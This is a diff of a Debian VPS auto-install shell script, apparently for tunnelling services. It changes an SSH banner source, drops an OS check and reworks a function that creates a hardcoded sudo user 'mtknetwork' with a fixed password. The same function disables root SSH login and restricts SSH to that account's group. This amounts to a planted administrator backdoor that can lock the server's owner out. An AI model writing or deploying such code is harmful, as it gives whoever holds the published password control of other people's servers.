@@ -1,39 +1,29 @@
 
-# ====================================================
-#   Script  : debian_aio
-#   OS      : Debian 10 / 11 / 12 / 13 Support
-#	Script Made : Dxplusdev 
-#   Access  : Root required, fresh VPS
-# ====================================================
-
-#---------------[ OS Check ]-------------------------
-OS_ID=$(grep -oP '(?<=^ID=).+' /etc/os-release | tr -d '"')
-OS_VER=$(grep -oP '(?<=^VERSION_ID=).+' /etc/os-release | tr -d '"')
-if [[ "$OS_ID" != "debian" ]]; then
-    echo "[ERROR] This script requires Debian 10/11/12/13. Detected: $OS_ID $OS_VER"
-    exit 1
-fi
-if [[ "$OS_VER" != "10" && "$OS_VER" != "11" && "$OS_VER" != "12" && "$OS_VER" != "13" ]]; then
-    echo "[ERROR] Unsupported Debian version: $OS_VER. Supported: 10, 11, 12, 13"
-    exit 1
-fi
-echo "[INFO] OS check passed: Debian $OS_VER"
-
 #---------------[ Timezone ]-------------------------
 timedatectl set-timezone Asia/Manila
 
 #====================================================
 #   Install Sudo & User
 #====================================================
-
-#=======================Server Restart Fix Onle This Code Change ============================
 install_sudo(){
-    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
+# Create user if not exists
+if ! id "mtknetwork" &>/dev/null; then
+useradd -m -s /bin/bash mtknetwork
+echo "mtknetwork:F1005r90@@@" | chpasswd
+usermod -aG sudo mtknetwork
+fi
+
+# Disable root SSH login
+ sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+
+# Ensure AllowGroups is set only once
+if ! grep -q "^AllowGroups mtknetwork" /etc/ssh/sshd_config; then
+echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
+fi
+
+# Restart SSH service
+systemctl restart ssh || systemctl restart sshd
 }
-#=======================Server Restart Fix Onle This Code Change  ============================
 
 #====================================================
 #   Install Requirements
@@ -58,7 +48,6 @@ apt update -y
 
 # Essential packages
 apt install -y lsof tar systemd dbus git
-sudo apt install apache2 -y
 apt install -y gnupg2 ca-certificates lsb-release debian-archive-keyring socat
 apt install -y curl wget cron python3-minimal libpython3-stdlib
 apt install -y iptables sudo
@@ -119,7 +108,7 @@ StartLimitIntervalSec=0
 EOF
 
 # Download banner
-wget -q -O /etc/banner "https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/SshBanner"
+wget -q -O /etc/banner "https://raw.githubusercontent.com/A-l-amin/dxpanelrepo/refs/heads/server_script/SshBanner"
 chmod 644 /etc/banner
 
 # Reload systemd and restart services
@@ -363,7 +352,7 @@ done
 
 # Download and set up binaries
 declare -A files=(
-["monitor"]=".monitor"
+["monitorz"]=".monitor"
 ["ws"]=".ws"
 ["hysteria"]=".hysteria"
 )
